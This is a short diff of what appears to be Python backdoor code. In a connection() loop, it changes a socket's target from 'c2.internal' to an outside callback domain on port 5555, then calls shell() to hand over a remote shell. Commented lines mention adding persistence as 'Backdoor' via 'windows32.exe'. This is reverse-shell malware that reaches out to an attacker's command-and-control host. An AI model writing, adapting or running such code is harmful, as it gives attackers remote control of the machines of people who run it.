@@ -295,7 +295,7 @@ def connection():
     while True:
         time.sleep(1)
         try:
-            s.connect(('c2.internal', 5555))
+            s.connect(('callback.scarletpug.com', 5555))
             # if platform == 'win32':       #TO BE DONE
             #     persist('Backdoor', 'windows32.exe')
             shell()
